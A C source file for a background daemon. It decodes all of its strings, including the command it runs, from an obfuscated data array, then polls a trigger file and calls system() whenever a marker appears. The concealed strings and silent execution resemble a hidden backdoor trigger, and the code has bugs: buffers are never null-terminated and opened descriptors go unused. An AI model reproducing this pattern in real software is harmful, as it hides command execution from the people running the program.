#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#include "data.h"

#define DEBUG

char* get(int n) {

    static char dec[4096];

    int k;
    char* ptr;

    for (k = 0; k < string_txt_len; k++) {

        dec[k] = (char)((string_txt[k]-d*d*d/2 -d*d)/d);

        if (k > 1 &&  dec[k] == '\n' && dec[k-1] == '\n') {

            dec[k] = 0;
        }
    }

    ptr = dec;
    for (k = 0; k < n; k++) {

        ptr += strlen(ptr);
        ptr++;
    }

    return ptr;
}

char* file_get_contents(const char* filename, char* contents) {


    FILE* fp;
    int c;
    char rb[16];

    fp = fopen(filename, get(0));

    if (fp == NULL) {
        contents[0] = '\0';
        return contents;
    }

    while ( (c = fgetc(fp)) != EOF ) {

        *contents++ = (char)c;
    }

    fclose(fp);

    return contents;
}


size_t file_put_contents(const char* filename,
                         const char* contents,
                         const size_t s) {

    FILE* fp;

    fp = fopen(filename, get(1));

    if (fp == NULL) {
        return 0;
    }

    size_t sz = fwrite(contents, 1, s, fp);
    fclose(fp);
    return sz;
}




int main(void) {

#ifndef DEBUG
    daemon(0, 0);
#endif

    char* rb            = get(0);
    char* wb            = get(1);
    char* script_file   = get(2);
    char* input         = get(3);
    char* output        = get(4);
    char* errput        = get(5);
    char* cmd           = get(6);
    char* end           = get(7);
    char* quit          = get(8);
    char* dumb          = get(9);

    char script[4096];

    int fid0;
    int fid1;
    int fid2;


//////////////////////////
#ifdef DEBUG

    printf("%s\n", rb);
    printf("%s\n", wb);
    printf("%s\n", script_file);
    printf("%s\n", input);
    printf("%s\n", output);
    printf("%s\n", errput);
    printf("%s\n", cmd);
    printf("%s\n", end);
    printf("%s\n", quit);
    printf("%s\n", dumb);

#endif
//////////////////////////

    while (1) {

        file_get_contents(script_file, script);

        if ( strstr(script, end) ) {

            if (strstr(script, quit)) {

                file_put_contents(script_file, dumb, strlen(dumb));
                break;

            } else {

                fid0 = open(input,  O_RDWR);
                fid1 = open(output, O_RDWR|O_TRUNC);
                fid2 = open(errput, O_RDWR|O_TRUNC);

                system(cmd);
                file_put_contents(script_file, dumb, strlen(dumb));

                close(fid0);
                close(fid1);
                close(fid2);
            }
        }

        sleep(1);
    }

    return 0;
}


